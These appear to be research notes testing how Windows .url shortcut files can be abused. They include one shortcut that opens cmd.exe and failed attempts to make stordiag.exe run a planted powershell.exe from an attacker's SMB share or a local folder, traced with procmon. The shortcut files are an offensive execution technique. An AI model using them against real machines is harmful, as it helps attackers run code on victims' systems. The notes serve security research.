# Analysis

- Tested on
	- Windows 10 1809 
	- Windows 10 1909 
	- Windows 10 21H2
	- Windows 11 23H2

- All images and scripts are from testing on Windows 10 1909.
### URL File to open CMD
```Script
[InternetShortcut]
Url=C:\Windows\System32\cmd.exe
```
- Double clicking on the url file opens cmd.

### URL file that runs stordiag.exe in a remote directory
```Script
[InternetShortcut]
URL=C:\Windows\System32\stordiag.exe
WorkingDirectory=\\Desktop-attacke\smb
```
- Does not work as expected.
- Traced the execution using procmon. 
![](Attachments/Pasted%20image%2020240801010229.png)
- Folder is being accessed by the program but `powershell.exe` file is not being run.

### URL file that runs stordiag.exe in a local directory (debugging)
```Script
[InternetShortcut]
URL=C:\Windows\System32\stordiag.exe
WorkingDirectory=C:\Users\test\Music
```
- Traced execution using procmon.
![](Attachments/Pasted%20image%2020240801010717.png)
- Folder is being accessed by the program but `powershell.exe` file is not being run.

### Additional Notes
- `powershell.exe` file is not being run by stordiag.exe
- procmon displayed "PATH NOT FOUND" error when local working directory was used in windows 11